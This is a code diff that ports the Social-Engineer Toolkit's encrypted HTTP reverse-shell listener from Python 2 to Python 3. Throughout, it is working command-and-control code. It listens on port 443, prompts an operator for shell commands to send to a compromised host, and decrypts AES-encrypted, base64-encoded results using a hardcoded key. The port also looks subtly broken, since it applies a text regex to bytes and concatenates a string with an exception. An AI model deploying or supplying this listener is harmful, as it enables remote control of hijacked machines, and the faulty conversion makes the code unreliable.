@@ -9,9 +9,9 @@
 #
 #
 ############################################
-from BaseHTTPServer import BaseHTTPRequestHandler
-from BaseHTTPServer import HTTPServer
-import urlparse
+from http.server import BaseHTTPRequestHandler
+from http.server import HTTPServer
+import urllib
 import re
 import os
 import base64
@@ -41,13 +41,18 @@ secret = "(3j^%sh@hd3hDH2u3h@*!~h~2&^lk<!L"
 cipher = AES.new(secret)
 
 # url decode for postbacks
+
+
 def htc(m):
-    return chr(int(m.group(1),16))
+    return chr(int(m.group(1), 16))
 
 # url decode
+
+
 def urldecode(url):
-    rex=re.compile('%([0-9a-hA-H][0-9a-hA-H])',re.M)
-    return rex.sub(htc,url)
+    rex = re.compile('%([0-9a-hA-H][0-9a-hA-H])', re.M)
+    return rex.sub(htc, url)
+
 
 class GetHandler(BaseHTTPRequestHandler):
 
@@ -55,7 +60,7 @@ class GetHandler(BaseHTTPRequestHandler):
     def do_GET(self):
 
         # this will be our shell command
-        message = raw_input("shell> ")
+        message = input("shell> ")
         # if we specify quit, then sys arg out of the shell
         if message == "quit" or message == "exit":
             print ("\nExiting the SET RevShell Listener... ")
@@ -86,17 +91,17 @@ class GetHandler(BaseHTTPRequestHandler):
         # read in the length of the POST data
         qs = self.rfile.read(length)
         # url decode
-        url=urldecode(qs)
+        url = urldecode(qs)
         # remove the parameter cmd
-        url=url.replace("cmd=", "")
+        url = url.replace("cmd=", "")
         # base64 decode
         message = base64.b64decode(url)
         # decrypt the string
         message = DecodeAES(cipher, message)
         # display the command back decrypted
-        print message
+        print(message)
 
-#if __name__ == '__main__':
+# if __name__ == '__main__':
 try:
     # bind to all interfaces
     if check_options("PORT=") != 0:
@@ -106,21 +111,21 @@ try:
         port = 443
 
     server = HTTPServer(('', int(port)), GetHandler)
-    print """############################################
+    print("""############################################
 #
 # The Social-Engineer Toolkit (SET) HTTP RevShell
 #
 #        Dave Kennedy (ReL1K)
 #     https://www.trustedsec.com
 #
-############################################"""
-    print 'Starting encrypted web shell server, use <Ctrl-C> to stop'
+############################################""")
+    print('Starting encrypted web shell server, use <Ctrl-C> to stop')
     # simple try block
     try:
         # serve and listen forever
         server.serve_forever()
     # handle keyboard interrupts
     except KeyboardInterrupt:
-        print "[!] Exiting the encrypted webserver shell.. hack the gibson."
-except Exception, e:
-    print "Something went wrong, printing error: " + e
+        print("[!] Exiting the encrypted webserver shell.. hack the gibson.")
+except Exception as e:
+    print("Something went wrong, printing error: " + e)
